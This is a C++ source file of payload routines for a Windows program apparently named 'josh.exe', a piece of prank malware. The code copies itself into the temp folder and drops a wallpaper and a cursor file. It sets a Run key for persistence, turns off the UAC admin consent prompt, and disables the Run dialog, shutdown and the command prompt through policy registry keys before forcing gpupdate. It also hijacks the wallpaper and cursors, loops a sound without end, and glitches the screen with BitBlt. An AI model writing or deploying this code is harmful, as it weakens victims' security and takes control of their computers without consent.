/*
 * For every payload!
*/


#include "functions.h"
#include "files.h"


namespace Payloads {
	
	const char* keys[6] = {
		"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",
		"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer",
		"SOFTWARE\\Policies\\Microsoft\\Windows\\System",
		"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
		"Control Panel\\Desktop",
		"Control Panel\\Cursors"
	};
	
	char background_path[MAX_PATH];
	char cursor_path[MAX_PATH];
	char exe_path[MAX_PATH];
	char tmp[MAX_PATH];
	
	
	int dropFiles(){
		
		WIN32_FIND_DATA f;
		
		int code = 69;
		
		GetTempPathA(MAX_PATH, (LPSTR)&tmp);
		SetCurrentDirectory((LPCSTR)&tmp);
		
		HANDLE hFind = FindFirstFileA("josh.exe", &f);
		if (hFind == INVALID_HANDLE_VALUE){
			
			GetModuleFileNameA(NULL, (LPSTR)&exe_path, MAX_PATH);
			CopyFile(exe_path, "josh.exe", TRUE);
			
			Functions::createFile("background.jpg", FILE_ATTRIBUTE_NORMAL, &background, 87579);
			Functions::createFile("cursor.cur", FILE_ATTRIBUTE_NORMAL, &cursor, 180638);
			
			code = 1;
		}
		FindClose(hFind);
		
		return code;
	}
	
	int persistence(){
		
		DWORD d1 = 0x00000000;
		DWORD d2 = 0x00000001;
		
		
		GetFullPathNameA("josh.exe", MAX_PATH, (LPSTR)&exe_path, NULL);
		
		Functions::setRegKey(HKEY_LOCAL_MACHINE, keys[0], "ConsentPromptBehaviorAdmin", REG_DWORD, (const BYTE*)&d1, sizeof(d1));
		Functions::setRegKey(HKEY_LOCAL_MACHINE, keys[1], "NoRun", REG_DWORD, (const BYTE*)&d2, sizeof(d2));
		Functions::setRegKey(HKEY_LOCAL_MACHINE, keys[1], "NoClose", REG_DWORD, (const BYTE*)&d2, sizeof(d2));
		Functions::setRegKey(HKEY_LOCAL_MACHINE, keys[3], "whistle_baby", REG_SZ, (const BYTE*)&exe_path, sizeof(exe_path));
		
		Functions::createAndSetRegKey(HKEY_CURRENT_USER, keys[2], "DisableCmd", REG_DWORD, (const BYTE*)&d2, sizeof(d2));
		//Functions::createAndSetRegKey(HKEY_CURRENT_USER, keys[0], "DisableTaskMgr", REG_DWORD, (const BYTE*)&d2, sizeof(d2));
		
		// Update registry info
		ShellExecuteA(NULL, NULL, "gpupdate", "/force", NULL, 0);
		Sleep(500);
		
		return 69;
	}
	
	int personalize(){
		
		const char* cursor_values[6] = {"AppStarting", "Arrow", "Hand", "Wait", "IBeam", "No"};

		
		GetFullPathNameA("background.jpg", MAX_PATH, (LPSTR)&background_path, NULL);
		GetFullPathNameA("cursor.cur", MAX_PATH, (LPSTR)&cursor_path, NULL);
		
		Functions::setRegKey(HKEY_CURRENT_USER, keys[4], "WallPaper", REG_SZ, (const BYTE*)&background_path, sizeof(background_path));
		
		for (int i = 0; i < 6; i++)
			Functions::setRegKey(HKEY_CURRENT_USER, keys[5], cursor_values[i], REG_SZ, (const BYTE*)&cursor_path, sizeof(cursor_path));
		
		return 69;
	}
	
	int firstOfApril(){
		
		SYSTEMTIME time;
		
		GetSystemTime(&time);
		if (time.wDay == 1 && time.wMonth == 4)
			return 1;
		
		return 69;
	}
	
	int music(){
		
		while (1)
			PlaySound(MAKEINTRESOURCE(69), NULL, SND_RESOURCE);
		
		return 69;
	}
	
	// :O
	DWORD WINAPI easterEgg(LPVOID lpParameter){
		
		HDC DC = GetDC(NULL);
		
		int w = GetSystemMetrics(SM_CXSCREEN);
		int h = GetSystemMetrics(SM_CYSCREEN);
		int i = -100;
		int p = 0;
		
		while (1){
			BitBlt(DC, i, rand() % 20, p, h, DC, i, 0, SRCCOPY);
			
			i > w ? i = -100 : i += 100;
			p > h ? p = 0 : p += 10;
			
			Sleep(50);
		}
	}
}